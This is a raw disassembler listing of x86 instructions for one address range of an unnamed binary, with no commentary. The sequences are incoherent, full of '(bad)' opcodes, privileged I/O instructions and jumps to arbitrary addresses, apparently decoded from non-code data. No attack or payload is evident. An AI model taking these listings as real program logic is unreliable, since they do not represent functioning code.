  420ebc:	add    ah,bh
  420ebe:	push   edi
  420ebf:	dec    esp
  420ec0:	push   ss
  420ec1:	xchg   esi,eax
  420ec3:	pop    ss
  420ec4:	mov    ch,BYTE PTR [ebx+0x6c]
  420ec7:	or     cl,bh
  420ec9:	scas   al,BYTE PTR es:[edi]
  420eca:	je     0x420f34
  420ecc:	aad    0x3
  420ece:	ficomp WORD PTR [ecx-0x46]
  420ed1:	dec    ebx
  420ed2:	das    
  420ed3:	adc    eax,0xd4aa5072
  420ed8:	hlt    
  420ed9:	adc    cl,BYTE PTR [eax+0xfd02ed4]
  420edf:	inc    ecx
  420ee0:	stc    
  420ee1:	ret    
  420ee2:	scas   al,BYTE PTR es:[edi]
  420ee3:	test   eax,0xbddba0cd
  420ee8:	add    BYTE PTR [ecx],bh
  420eea:	sbb    DWORD PTR [eax-0x7e98c0f1],eax
  420ef0:	mov    dh,0x54
  420ef2:	xor    cl,cl
  420ef4:	loopne 0x420f59
  420ef6:	pop    eax
  420ef7:	fwait
  420ef8:	enter  0xc271,0x48
  420efc:	xchg   ecx,eax
  420efd:	sar    BYTE PTR [ecx+0x4725b7da],cl
  420f03:	inc    ecx
  420f04:	sbb    eax,0x2b01aba3
  420f09:	scas   eax,DWORD PTR es:[edi]
  420f0a:	ss pop ebx
  420f0c:	mov    ds:0xd45cd3eb,eax
	...
  420f71:	add    BYTE PTR [eax],al
  420f73:	add    BYTE PTR [eax],ah
  420f75:	xchg   edi,eax
  420f76:	inc    edx
  420f77:	shl    edi,cl
  420f79:	xlat   BYTE PTR ds:[ebx]
  420f7a:	mov    cl,0xf7
  420f7c:	jg     0x420f6b
  420f7e:	or     esp,DWORD PTR [esi-0x3022f22]
  420f84:	xchg   ebx,eax
  420f85:	pop    edi
  420f86:	add    DWORD PTR [eax],eax
  420f88:	add    eax,0x2c000001
  420f8d:	idiv   DWORD PTR [ebx+0x43]
  420f90:	bound  ebp,QWORD PTR [eax*8-0x21054393]
  420f97:	push   ebx
  420f98:	add    BYTE PTR [edx-0x3d159d24],0x53
  420f9f:	xchg   edi,eax
  420fa0:	daa    
  420fa1:	or     ch,BYTE PTR [ebx-0x4b]
  420fa4:	mov    eax,0x435502cb
  420fa9:	inc    edi
  420faa:	(bad)  
  420fab:	cli    
  420fac:	sub    esp,DWORD PTR [esi]
  420fae:	pop    ebp
  420faf:	mov    eax,DWORD PTR [eax+0x7b8ae01]
  420fb5:	imul   esi,ecx,0xf7cdc1ce
  420fbb:	stos   BYTE PTR es:[edi],al
  420fbc:	xor    dh,BYTE PTR [edi-0x12]
  420fbf:	push   esi
  420fc0:	sub    ah,cl
  420fc2:	dec    edi
  420fc3:	pop    edx
  420fc4:	jb     0x420fe1
  420fc6:	imul   edi,DWORD PTR [ebx+eax*2+0x4],0x37c99a09
  420fce:	cmp    eax,0x42556c93
  420fd3:	cld    
  420fd4:	lock or eax,0xbb87dede
  420fda:	cwde   
  420fdb:	in     eax,dx
  420fdc:	call   0x1084:0xc2b0aadf
  420fe3:	cwde   
  420fe4:	arpl   WORD PTR [edx],bx
  420fe6:	pop    ecx
  420fe7:	dec    edi
  420fe8:	enter  0xc891,0xa8
  420fec:	test   DWORD PTR [esi+0x23b942b7],esp
  420ff2:	push   ecx
  420ff3:	dec    ebx
  420ff4:	jnp    0x420f7d
  420ff6:	add    eax,0x77dabcad
  420ffb:	call   0xc412d8ea
  421000:	jb     0x420fb6
  421002:	xchg   ebx,eax
  421003:	aas    
  421004:	pop    esp
  421005:	(bad)  
  421006:	aas    
  421007:	repnz shr DWORD PTR [edx-0x31],cl
  42100b:	push   edx
  42100c:	mov    eax,edx
  42100e:	in     eax,0x2b
  421010:	(bad)  
  421011:	xor    al,0x20
  421013:	jne    0x420ffa
  421015:	ins    DWORD PTR es:[edi],dx
  421016:	ficom  WORD PTR [esi-0x76]
  421019:	ds push 0x1f
  42101c:	std    
  42101d:	test   DWORD PTR [edi],esi
  42101f:	adc    bh,BYTE PTR [edx+eax*2-0x1af3fce5]
  421026:	(bad)  
  421028:	popa   
  421029:	rcl    BYTE PTR [ecx+0x6d4635be],cl
  42102f:	or     eax,0x858dc375
  421034:	call   0xee31e2c
  421039:	idiv   BYTE PTR [edi+0x5c6e075b]
  42103f:	cwde   
  421040:	repz imul bl
  421043:	popf   
  421044:	fnsave [edx]
  421046:	xor    DWORD PTR [edi],edx
  421048:	(bad)  
  421049:	xor    edx,ebp
  42104b:	(bad)  
  42104c:	dec    edx
  42104d:	cmp    eax,0xc23ba4bf
  421052:	out    0xc9,eax
  421054:	sbb    esi,0x713b538b
  42105a:	mov    eax,0x34e37bb8
  42105f:	out    0xc2,al
  421061:	add    eax,0x12faea1d
  421066:	inc    edi
  421067:	pop    ecx
  421068:	cli    
  421069:	pop    es
  42106a:	dec    edx
  42106b:	inc    edx
  42106c:	(bad)  
  42106e:	jge    0x42102a
  421070:	clc    
  421071:	into   
  421072:	pusha  
  421073:	inc    ebp
  421074:	push   esp
  421075:	mov    eax,ds:0x400a309a
  42107a:	popa   
  42107b:	mov    fs,WORD PTR [edx+0x44]
  42107e:	(bad)  
  42107f:	mov    ch,BYTE PTR [edx-0x242bcb27]
  421085:	jmp    0x85c8d2f4
  42108a:	in     al,0xe2
  42108c:	adc    eax,0x595f6667
	...
  4210f1:	add    BYTE PTR [eax],al
  4210f3:	add    BYTE PTR [edi-0x243925a2],bl
  4210f9:	(bad)  
  4210fa:	lahf   
  4210fb:	pop    edi
  4210fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4210fd:	jne    0x4210e1
  4210ff:	mov    ?,esi
  421101:	jmp    0x60dab458
  421106:	add    DWORD PTR [eax],eax
  421108:	add    eax,0x62000001
  42110d:	ja     0x4210ba
  42110f:	(bad)  [ecx-0x3d]
  421112:	inc    esi
  421113:	out    dx,eax
  421114:	mov    esp,0x1b730261
  421119:	cli    
  42111a:	dec    ebx
  42111b:	push   0xedd43692
  421120:	mov    edx,0xdd6be094
  421125:	test   eax,0xfec1232d
  42112a:	data16 fiadd DWORD PTR [edx]
  42112d:	in     eax,dx
  42112e:	or     BYTE PTR [esi],bl
  421130:	popa   
  421131:	xchg   edx,ecx
  421133:	into   
  421134:	ins    DWORD PTR es:[edi],dx
  421135:	fnsave [ecx-0x50]
  421138:	jmp    FWORD PTR gs:[edx+0x6c]
  42113c:	add    ah,BYTE PTR [ebx+0x4924be80]
  421142:	fwait
  421143:	xchg   edi,eax
  421144:	sbb    ah,BYTE PTR [ebx]
  421146:	xor    ebx,esp
  421148:	repnz pop esi
  42114a:	cwde   
  42114b:	pop    es
  42114c:	xor    cl,cl
  42114e:	icebp  
  42114f:	xor    esp,DWORD PTR [ecx]
  421151:	and    DWORD PTR [esp+edx*1+0x4ad1f955],edx
  421158:	push   edx
  421159:	inc    ebp
  42115a:	pop    edi
  42115b:	out    dx,al
  42115c:	in     eax,0x85
  42115e:	add    eax,0xd5180097
  421163:	or     BYTE PTR [eax-0x1c],0xad
  421167:	xchg   ecx,eax
  421168:	mov    eax,ds:0xeb767628
  42116d:	push   edx
  42116e:	mov    gs,WORD PTR [edi-0x15]
  421171:	shr    DWORD PTR [edi-0x10246089],cl
  421177:	sbb    DWORD PTR [esi+esi*4],eax
  42117a:	rol    DWORD PTR [ebp-0x13],1
  42117d:	mov    dh,0x2a
  42117f:	inc    edx
  421180:	add    eax,DWORD PTR [edx]
  421182:	(bad)  
  421184:	adc    bh,BYTE PTR [ebx+edx*2-0x9]
  421188:	sub    BYTE PTR [ecx-0x5b5efc64],dl
  42118e:	rol    DWORD PTR [ebp+0x3641c1a2],0x80
  421195:	cmp    esi,DWORD PTR ds:[ebx]
  421198:	and    edx,DWORD PTR [edi+0x716b5a5a]
  42119e:	push   0x7e420a8a
  4211a3:	jno    0x4211d7
  4211a5:	push   eax
  4211a6:	adc    DWORD PTR [ecx-0x34a5d014],eax
  4211ac:	dec    edx
  4211ad:	dec    edi
  4211ae:	mov    eax,0xd0fc7a85
  4211b3:	mov    esi,DWORD PTR [eax]
  4211b5:	imul   eax,DWORD PTR [eax-0x23efdfc8],0xa33d9d45
  4211bf:	cdq    
  4211c0:	cmp    al,0xbc
  4211c2:	sub    eax,0x855f318e
  4211c7:	adc    BYTE PTR [eax+esi*4-0x41bb8ee6],dl
  4211ce:	inc    eax
  4211cf:	fdivr  DWORD PTR [ebx+0x1d]
  4211d2:	mov    ebp,0x4fac41cd
  4211d7:	ret    0x5177
  4211da:	cmp    eax,0xa8b412ce
  4211df:	dec    esp
  4211e0:	aad    0x1b
  4211e2:	mov    edi,0x94a1da26
  4211e7:	in     al,0x96
  4211e9:	xor    BYTE PTR [esi-0x19],ch
  4211ec:	add    eax,esi
  4211ee:	inc    ebx
  4211ef:	cmp    al,0x21
  4211f1:	cdq    
  4211f2:	call   0x649c:0x3c528fac
  4211f9:	adc    esp,DWORD PTR [ebp+ebx*2+0xb0b57a5]
  421200:	xchg   esp,eax
  421201:	mov    ch,0x45
  421203:	add    al,0x65
  421205:	pop    eax
  421206:	xchg   ecx,eax
  421207:	call   0x602d:0xa3a2c188
  42120e:	xor    DWORD PTR gs:[ebx+0x0],0x0
	...
  421272:	add    BYTE PTR [eax],al
  421274:	sahf   
  421275:	pop    ds
  421276:	(bad)  
  421277:	test   DWORD PTR [edi-0x42800109],0xf7ab32d
  421281:	cmp    DWORD PTR [edi],esi
  421283:	clc    
  421284:	popf   
  421285:	popa   
  421286:	add    DWORD PTR [eax],eax
  421288:	add    eax,0xc2000001
  42128d:	cmp    al,0x4c
  42128f:	xchg   BYTE PTR [esi-0x3e717103],al
  421295:	ret    
  421296:	push   esp
  421297:	cli    
  421298:	mov    eax,0xa859324e
  42129d:	call   0x2edef002
  4212a2:	inc    eax
  4212a3:	sbb    esi,DWORD PTR [ecx+0x22]
  4212a6:	and    al,0x17
  4212a8:	pop    ebp
  4212a9:	adc    ah,bl
  4212ab:	sbb    bh,BYTE PTR [eax-0x2905393a]
  4212b1:	xchg   esi,eax
  4212b2:	std    
  4212b3:	dec    esp
  4212b4:	push   edi
  4212b5:	push   esp
  4212b6:	add    al,0xb
  4212b8:	push   eax
  4212b9:	fnstcw WORD PTR [ebp+0x74333df7]
  4212bf:	sbb    esp,DWORD PTR [edx-0x52449c64]
  4212c5:	into   
  4212c6:	into   
  4212c7:	and    bl,bl
  4212c9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4212ca:	mov    cl,0xde
  4212cc:	or     al,0x9d
  4212ce:	test   DWORD PTR [ebx+ebx*1+0x73cda53d],edi
  4212d5:	fmul   st,st(5)
  4212d7:	cmp    cl,BYTE PTR [ebx-0x28]
  4212da:	and    DWORD PTR [edx+0x71],edx
  4212dd:	mov    esp,DWORD PTR [edi+0x66ee0836]
  4212e3:	xlat   BYTE PTR ds:[ebx]
  4212e4:	push   esp
  4212e5:	adc    eax,0x722956ef
  4212ea:	stos   BYTE PTR es:[edi],al
  4212eb:	in     eax,0x41
  4212ed:	neg    DWORD PTR [ebx-0x40c52582]
  4212f3:	imul   edi,DWORD PTR es:[ecx+0x278221a3],0xf7d31bb1
  4212fe:	in     al,dx
  4212ff:	ror    esi,0xc1
  421302:	ins    BYTE PTR es:[edi],dx
  421303:	aas    
  421304:	dec    ebx
  421305:	jno    0x421290
  421307:	iret   
  421308:	cmp    eax,0x9c4f81d3
  42130d:	adc    BYTE PTR [edx],dh
  42130f:	mov    ds:0x8e5395ed,al
  421314:	push   esi
  421315:	mov    esi,0xad86629c
  42131a:	sbb    BYTE PTR [edi-0x36],ch
  42131d:	dec    eax
  42131e:	pop    edx
  42131f:	and    eax,0xec12c2be
  421324:	pop    es
  421325:	ss pop ebx
  421327:	cmp    DWORD PTR [edi],esp
  421329:	jmp    0x421308
  42132b:	xchg   ebx,eax
  42132c:	cdq    
  42132d:	cmp    eax,esp
  42132f:	pop    ds
  421330:	sti    
  421331:	fst    QWORD PTR [ebx-0x71]
  421334:	push   edx
  421335:	xchg   esi,eax
  421336:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421337:	mov    WORD PTR [esp+ebx*4+0x67f051f],ds
  42133e:	inc    eax
  42133f:	rcr    DWORD PTR [edi+0x51],0x30
  421343:	dec    ebx
  421344:	xchg   ecx,eax
  421345:	mov    esi,DWORD PTR [edx]
  421347:	(bad)  
  421348:	les    edi,FWORD PTR [ecx]
  42134a:	sub    bl,dh
  42134c:	adc    bh,BYTE PTR [ebx+0x4d]
  42134f:	sub    DWORD PTR [eax-0x3f],ebx
  421352:	repz xor al,0xa6
  421355:	add    ebx,DWORD PTR [esi]
  421357:	jg     0x421308
  421359:	daa    
  42135a:	and    bh,ah
  42135c:	jns    0x4213c6
  42135e:	xor    eax,0x296258f
  421363:	icebp  
  421364:	fdivr  QWORD PTR ds:0x1935c384
  42136a:	lods   eax,DWORD PTR ds:[esi]
  42136b:	icebp  
  42136c:	cmc    
  42136d:	sbb    al,0x65
  42136f:	sub    al,BYTE PTR [ebx-0x75efe54f]
  421375:	in     eax,0x82
  421377:	jmp    0x2d905968
  42137c:	sub    ebx,esp
  42137e:	or     al,0x9c
  421380:	test   al,0x1b
  421382:	dec    edx
  421383:	xchg   ebx,eax
  421384:	data16 out 0x28,al
  421387:	std    
  421388:	ret    0x5d9e
  42138b:	push   ds
  42138c:	cdq    
  42138d:	outs   dx,DWORD PTR ds:[esi]
  42138e:	sub    bl,BYTE PTR [ebp+0x46]
	...
  4213f4:	inc    bh
  4213f6:	pop    esp
  4213f7:	mov    eax,ds:0xdfffbb7d
  4213fc:	fstp   DWORD PTR [ebp-0x7ec40b61]
  421402:	mov    ebx,0x162a2ea
  421407:	add    BYTE PTR ds:0x29000001,al
  42140d:	jo     0x42141e
  42140f:	loop   0x421433
  421411:	mov    ebp,0xedd2b1f8
  421416:	mov    ds:0x94cfd7ad,eax
  42141b:	call   0xa41ea048
  421420:	aam    0x66
  421422:	rcr    BYTE PTR [esi-0x615dc44e],1
  421428:	sub    dh,BYTE PTR [eax-0x18]
  42142b:	retf   0x814d
  42142e:	mov    ch,0xeb
  421430:	mov    al,ds:0x96c58e80
  421435:	test   al,0x25
  421437:	fisub  DWORD PTR [ecx-0x33e11884]
  42143d:	dec    edx
  42143e:	xchg   esp,eax
  42143f:	cwde   
  421440:	push   es
  421441:	inc    esi
  421442:	or     edx,DWORD PTR [edi+eiz*2+0x3ea415b]
  421449:	push   eax
  42144a:	xor    al,ch
  42144c:	out    dx,eax
  42144d:	mov    ah,0x44
  42144f:	ret    
  421450:	push   ecx
  421451:	lock dec ecx
  421453:	clc    
  421454:	xor    al,0x63
  421456:	hlt    
  421457:	cmp    BYTE PTR [eax],bh
  421459:	pop    eax
  42145a:	mov    esi,0xc4670e5c
  42145f:	cli    
  421460:	push   ds
  421461:	pop    esp
  421462:	fwait
  421463:	test   eax,0xa3675de9
  421468:	inc    esi
  421469:	arpl   ax,dx
  42146b:	lahf   
  42146c:	cmp    ebx,edi
  42146e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42146f:	push   esp
  421470:	aam    0x7a
  421472:	push   ss
  421473:	(bad)  
  421475:	and    ah,ch
  421477:	js     0x421423
  421479:	add    BYTE PTR [ecx+0x7893688f],bh
  42147f:	sbb    al,0xf0
  421481:	jecxz  0x4214d4
  421483:	sub    edi,edi
  421485:	inc    ecx
  421486:	xchg   DWORD PTR ds:0xaed4aef6,edx
  42148c:	rcl    BYTE PTR [edx+0x58346e46],0xd5
  421493:	test   DWORD PTR [eax+ecx*4+0x5d],ebx
  421497:	push   edi
  421498:	mov    eax,ds:0x733fa919
  42149d:	xchg   esp,esi
  42149f:	(bad)  
  4214a0:	(bad)  
  4214a1:	enter  0x9244,0x76
  4214a5:	cwde   
  4214a6:	adc    esi,eax
  4214a8:	mov    esp,0x988b15ae
  4214ad:	neg    DWORD PTR [ebx-0x22]
  4214b0:	imul   edi,DWORD PTR [esi],0xae3c0808
  4214b6:	idiv   DWORD PTR [ebp+0x6ab8c5eb]
  4214bc:	mov    edx,0x6dced757
  4214c1:	pop    ds
  4214c2:	out    dx,eax
  4214c3:	retf   0x1cff
  4214c6:	xor    DWORD PTR [ebx],esi
  4214c8:	repz cwde 
  4214ca:	cmp    eax,0x77f49868
  4214cf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4214d0:	inc    edx
  4214d1:	scas   eax,DWORD PTR es:[edi]
  4214d2:	out    dx,al
  4214d3:	nop
  4214d4:	js     0x4214ba
  4214d6:	push   ecx
  4214d7:	nop
  4214d8:	int    0x6a
  4214da:	mov    cl,dh
  4214dc:	popa   
  4214dd:	ret    0x9d1f
  4214e0:	mov    al,ds:0x816aeb67
  4214e5:	dec    eax
  4214e6:	or     bl,dl
  4214e8:	pop    ss
  4214e9:	lods   al,BYTE PTR gs:[esi]
  4214eb:	pop    ebx
  4214ec:	out    0xb7,al
  4214ee:	push   edx
  4214ef:	xchg   edx,eax
  4214f0:	das    
  4214f1:	sbb    bh,BYTE PTR [ebx-0x4ddeaa72]
  4214f7:	jnp    0x42148d
  4214f9:	pop    esp
  4214fa:	add    al,0xc
  4214fc:	(bad)  
  4214fd:	sbb    BYTE PTR [esi+0x2c],dl
  421500:	cmc    
  421501:	cmp    ch,BYTE PTR [ebp-0x2f]
  421504:	jne    0x4214cc
  421506:	test   BYTE PTR [esi+0x18967e53],bh
  42150c:	mov    ebx,0xc9e5dc5a
	...
  421571:	add    BYTE PTR [eax],al
  421573:	add    dh,dl
  421575:	repnz test BYTE PTR [eax],bl
  421578:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421579:	jle    0x421559
  42157b:	(bad)  
  42157c:	arpl   WORD PTR [eax-0x447bbd4c],bp
  421582:	cld    
  421583:	dec    esp
  421584:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421585:	arpl   WORD PTR [ecx],ax
  421587:	add    BYTE PTR ds:0x6000001,al
  42158d:	pop    edi
  42158e:	pop    es
  42158f:	in     al,dx
  421590:	xor    DWORD PTR [ebp-0x72],edx
  421593:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  421595:	(bad)  
  421597:	js     0x421581
  421599:	jmp    0xa964168b
  42159e:	clc    
  42159f:	dec    ebx
  4215a0:	and    DWORD PTR [ecx],ecx
  4215a2:	pushf  
  4215a3:	push   edx
  4215a4:	mov    cl,0xd0
  4215a6:	or     al,dh
  4215a8:	jmp    0x65c19438
  4215ad:	sub    DWORD PTR [ecx+esi*1],esi
  4215b0:	dec    ecx
  4215b1:	repz icebp 
  4215b3:	sti    
  4215b4:	xor    DWORD PTR [esi],eax
  4215b6:	test   DWORD PTR [esi+0x30],ebp
  4215b9:	clc    
  4215ba:	and    bl,ch
  4215bc:	push   edi
  4215bd:	xor    ebp,DWORD PTR [edi]
  4215bf:	fmul   DWORD PTR [eax-0x6a115a4e]
  4215c5:	lods   al,BYTE PTR ds:[esi]
  4215c6:	or     edx,DWORD PTR [esp+ebp*8+0x33ce140c]
  4215cd:	mov    ecx,0xaf448ec5
  4215d2:	or     esi,ecx
  4215d4:	or     dl,BYTE PTR [ebx+0x10]
  4215d7:	ret    0xa234
  4215da:	imul   bl
  4215dc:	pop    esp
  4215dd:	pop    ss
  4215de:	add    DWORD PTR [edx+0xa],edx
  4215e1:	mov    edi,0xa5fdc827
  4215e6:	jno    0x4215b1
  4215e8:	in     al,dx
  4215e9:	popf   
  4215ea:	pop    eax
  4215eb:	adc    cl,cl
  4215ed:	test   al,0xac
  4215ef:	mov    DWORD PTR [eax],esp
  4215f1:	retf   
  4215f2:	pop    edx
  4215f3:	mov    esp,0x1c31c3fd
  4215f8:	outs   dx,DWORD PTR ds:[esi]
  4215fa:	xor    ecx,esp
  4215fc:	not    BYTE PTR [edi-0x6e]
  4215ff:	sar    edx,1
  421601:	push   ss
  421602:	and    dl,BYTE PTR [ebp-0x41c34320]
  421608:	sbb    ebp,edx
  42160a:	add    al,BYTE PTR [esp+ebx*4]
  42160d:	push   ss
  42160e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42160f:	loop   0x4215c6
  421611:	mov    edi,0xb9e0f7d1
  421616:	not    BYTE PTR [edx]
  421618:	sub    cl,BYTE PTR [eax]
  42161a:	mov    bl,BYTE PTR [edx-0x7]
  42161d:	jmp    0x6a91f361
  421622:	scas   eax,DWORD PTR es:[edi]
  421623:	lock xor ecx,DWORD PTR [ecx-0x8391908]
  42162a:	push   ebx
  42162b:	mov    ds:0xac7053bd,al
  421630:	dec    ecx
  421631:	test   BYTE PTR [eiz*4-0x3a9b476e],0xca
  421639:	jmp    0x4c89:0xcdcec8a3
  421640:	inc    esp
  421641:	mov    WORD PTR [ecx],?
  421643:	fiadd  DWORD PTR [eax+esi*8-0x3bb28fc2]
  42164a:	aam    0xb3
  42164c:	bound  esp,QWORD PTR [edx+0x9]
  42164f:	add    al,0xe1
  421651:	push   ebp
  421652:	sbb    al,0xeb
  421655:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421657:	js     0x421638
  421659:	push   esp
  42165a:	mov    DWORD PTR [ebx+esi*8],ebx
  42165d:	inc    edx
  42165e:	add    al,0x12
  421660:	loopne 0x421681
  421662:	mov    dl,0x3a
  421664:	loopne 0x421636
  421666:	sub    DWORD PTR [eax-0x3e],0x79
  42166a:	jmp    0x266c:0x86b9bf5a
  421671:	mov    edx,0xd574e18
  421676:	mov    eax,ds:0x78a9d651
  42167b:	cmc    
  42167c:	(bad)  
  42167d:	jo     0x421670
  42167f:	fst    DWORD PTR [eax]
  421681:	jp     0x42163b
  421683:	sbb    BYTE PTR [eax],0xd3
  421686:	stos   DWORD PTR es:[edi],eax
  421687:	jle    0x421692
  421689:	out    dx,al
  42168a:	fbld   TBYTE PTR [ebx-0x2e]
  42168d:	scas   al,BYTE PTR es:[edi]
  42168e:	push   cs
  42168f:	adc    eax,0x81
	...
  4216f4:	stos   DWORD PTR es:[edi],eax
  4216f5:	sub    al,0xed
  4216f7:	stos   BYTE PTR es:[edi],al
  4216f8:	out    dx,eax
  4216f9:	jmp    0x4216ea
  4216fb:	sub    eax,0xa3418669
  421700:	pop    eax
  421701:	and    al,0xe5
  421703:	stos   BYTE PTR es:[edi],al
  421704:	lods   al,BYTE PTR ds:[esi]
  421705:	add    DWORD PTR fs:[eax],eax
  421708:	add    eax,0xc7000001
  42170d:	xor    al,0x3d
  42170f:	hlt    
  421710:	xchg   ecx,eax
  421711:	adc    edx,DWORD PTR [ebx+0x2e]
  421714:	rol    DWORD PTR [eax+0x3eb37695],cl
  42171a:	dec    eax
  42171b:	push   ebp
  42171c:	out    0x8b,al
  42171e:	test   DWORD PTR [ecx-0x150fcbcc],edi
  421724:	add    esp,DWORD PTR [edi]
  421726:	adc    BYTE PTR [ecx+0x36],dh
  421729:	retf   
  42172a:	es push es
  42172c:	xchg   dh,dl
  42172e:	cmp    edx,DWORD PTR [ecx]
  421730:	and    ebx,DWORD PTR [esi+0x5d]
  421733:	aam    0x8
  421735:	pop    ds
  421736:	mov    eax,DWORD PTR [esi-0x6a5cd7]
  42173c:	push   0x137e69dc
  421741:	mov    DWORD PTR [esi+eiz*2+0x6f],eax
  421745:	cld    
  421746:	das    
  421747:	mov    ch,BYTE PTR [edi*4-0x6fa7b9f7]
  42174e:	sbb    DWORD PTR [ebx+ebp*1],ecx
  421751:	jp     0x421764
  421753:	jle    0x42175e
  421755:	mov    bl,0x69
  421757:	jno    0x42173b
  421759:	iret   
  42175a:	outs   dx,BYTE PTR ds:[esi]
  42175b:	cmp    eax,0x6a360a92
  421760:	sub    DWORD PTR [ebx+0x71ce74d5],eax
  421766:	xor    al,0x8
  421768:	push   ebp
  421769:	add    bl,cl
  42176b:	lea    edx,[ebx+0x7df22b7c]
  421771:	std    
  421772:	lods   eax,DWORD PTR ds:[esi]
  421773:	inc    ebp
  421774:	fwait
  421775:	jl     0x4217be
  421777:	sub    al,0x46
  421779:	sub    al,al
  42177b:	out    0xf5,al
  42177d:	push   ecx
  42177e:	call   0xd153184b
  421783:	adc    eax,DWORD PTR [ecx-0x39]
  421786:	adc    ebx,0xea1b6d1
  42178c:	in     al,0x28
  42178e:	dec    edi
  42178f:	mov    esi,edi
  421791:	(bad)  
  421792:	inc    eax
  421793:	jp     0x4217f6
  421795:	icebp  
  421796:	(bad)  
  421797:	scas   eax,DWORD PTR es:[edi]
  421798:	hlt    
  421799:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42179a:	scas   eax,DWORD PTR es:[edi]
  42179b:	jecxz  0x42178a
  42179d:	pop    es
  42179e:	xchg   ebp,eax
  42179f:	shl    DWORD PTR [edx],1
  4217a1:	inc    edx
  4217a2:	into   
  4217a3:	add    bh,bh
  4217a5:	push   eax
  4217a6:	mov    edi,0xb282d347
  4217ab:	sub    eax,0x5f7c92df
  4217b0:	xchg   ebp,eax
  4217b1:	xchg   dh,bl
  4217b3:	sub    al,BYTE PTR [esi+eax*1]
  4217b6:	rcr    BYTE PTR [eax+0x79],0x25
  4217ba:	pusha  
  4217bb:	push   0xc5429002
  4217c0:	xchg   esi,eax
  4217c1:	push   ebx
  4217c2:	ret    
  4217c3:	add    eax,0x21b343ef
  4217c8:	jno    0x42176c
  4217ca:	sub    ah,ch
  4217cc:	mov    ah,BYTE PTR [ebp-0x55]
  4217cf:	inc    ebx
  4217d0:	jp     0x4217ad
  4217d2:	mov    ebx,0x85d9c577
  4217d7:	push   ds
  4217d8:	jg     0x42175b
  4217da:	pop    es
  4217db:	mov    ds:0xe88278d2,al
  4217e0:	sub    eax,0xc6c4c560
  4217e5:	xchg   ebx,eax
  4217e6:	retf   
  4217e7:	pop    ds
  4217e8:	dec    ebp
  4217e9:	xor    esi,DWORD PTR [edx-0x20]
  4217ec:	ds dec edx
  4217ee:	arpl   WORD PTR [edi-0x29],bp
  4217f1:	mov    esi,0xd69d72e0
  4217f6:	ss dec edi
  4217f8:	mov    ebx,DWORD PTR [esi+0x2f]
  4217fb:	cwde   
  4217fc:	sar    DWORD PTR [esi],0xe7
  4217ff:	addr16 pop es
  421801:	aad    0x10
  421803:	sub    eax,0x80a5e
  421808:	xchg   esp,eax
  421809:	and    eax,0x56053996
  42180e:	pop    ebp
  42180f:	mov    bh,0x10
	...
  421871:	add    BYTE PTR [eax],al
  421873:	add    cl,dl
  421875:	mov    al,ds:0xf9f9e0b9
  42187a:	fnstenv [ecx-0x359a0174]
  421880:	das    
  421881:	jae    0x421831
  421883:	popf   
  421884:	mov    cl,0x65
  421886:	add    DWORD PTR [eax],eax
  421888:	add    eax,0xa7000001
  42188d:	mov    BYTE PTR [ebp-0x3c06cd4f],bl
  421893:	add    BYTE PTR [edx+ebx*4-0x59],bl
  421897:	rcl    esi,0xe2
  42189a:	mov    eax,ds:0xfbbf5719
  42189f:	xchg   DWORD PTR [edx],edx
  4218a1:	sub    BYTE PTR es:[eax+esi*4],dl
  4218a5:	push   ebp
  4218a6:	inc    edx
  4218a7:	adc    DWORD PTR [ebx+edi*1],edi
  4218aa:	pop    ebp
  4218ab:	xchg   ecx,eax
  4218ac:	(bad)  
  4218ae:	xor    eax,DWORD PTR [ebx+0x4c]
  4218b1:	jmp    0x5c181555
  4218b6:	or     BYTE PTR [esi],0xab
  4218b9:	jmp    0x9943:0x2e29c99d
  4218c0:	cmp    eax,0x2e28b89f
  4218c5:	pop    edx
  4218c6:	mov    eax,DWORD PTR [ecx*2-0x4739dd3c]
  4218cd:	stos   BYTE PTR es:[edi],al
  4218ce:	push   ecx
  4218cf:	(bad)  
  4218d1:	add    DWORD PTR [ebx+eax*8],0xffffffcb
  4218d5:	in     al,dx
  4218d6:	out    dx,eax
  4218d7:	adc    eax,0x67bf87e8
  4218dc:	out    dx,al
  4218dd:	push   edx
  4218de:	psrld  mm4,QWORD PTR [esi]
  4218e1:	xor    DWORD PTR [edx],0xffffff8d
  4218e4:	rcr    BYTE PTR [esi+0x5b08e3a1],cl
  4218ea:	xchg   edx,eax
  4218eb:	outs   dx,BYTE PTR ds:[esi]
  4218ec:	and    BYTE PTR [edx+0x62714229],0x7c
  4218f3:	nop
  4218f4:	int    0xd7
  4218f6:	ror    DWORD PTR [ebx+0x4cdd3ebb],0x40
  4218fd:	push   ss
  4218fe:	mov    esp,0x5786c089
  421903:	or     al,0x21
  421905:	loop   0x421979
  421907:	ss cld 
  421909:	aaa    
  42190a:	test   BYTE PTR [edx+0x2a2943f7],bh
  421910:	aad    0xb8
  421912:	mov    bl,0xcc
  421914:	scas   al,BYTE PTR es:[edi]
  421915:	sahf   
  421916:	or     ah,BYTE PTR [eax]
  421918:	rol    BYTE PTR [edx-0x437b63bc],1
  42191e:	sub    eax,0x44019054
  421923:	inc    si
  421925:	loop   0x4218a9
  421927:	mov    dl,0xf7
  421929:	call   0x692fa6bf
  42192e:	mov    esp,DWORD PTR [ebx-0x6b26612]
  421934:	scas   al,BYTE PTR es:[edi]
  421935:	jmp    0x36c41ad2
  42193a:	cmp    BYTE PTR [ebp-0x1c],dh
  42193d:	out    dx,al
  42193e:	call   0x377f:0x6d0816aa
  421945:	fmul   QWORD PTR [esi+0x7107ff1]
  42194b:	sub    al,0x36
  42194d:	sti    
  42194e:	dec    esp
  42194f:	out    dx,al
  421950:	aas    
  421951:	xor    DWORD PTR [eax],edi
  421953:	jl     0x421986
  421955:	test   eax,0x977ca071
  42195a:	push   ebp
  42195b:	xor    cl,bh
  42195d:	clc    
  42195e:	stc    
  42195f:	cmp    eax,0x9220392c
  421964:	or     dh,dl
  421966:	xchg   ebp,eax
  421967:	nop
  421968:	jne    0x42190e
  42196a:	xor    BYTE PTR [eax],0x51
  42196d:	pop    es
